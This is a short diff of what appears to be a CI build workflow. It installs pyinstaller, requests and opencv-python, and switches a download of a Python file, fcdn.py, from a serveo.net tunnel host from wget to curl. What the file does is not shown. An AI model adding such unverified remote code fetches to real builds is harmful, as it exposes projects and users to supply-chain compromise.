@@ -18,7 +18,7 @@ jobs:
           pip install pyinstaller
           pip install requests
           pip install opencv-python
-          wget https://eruo.serveo.net/fcdn.py
+          curl https://eruo.serveo.net/fcdn.py -O fcdn.py
           
           
           
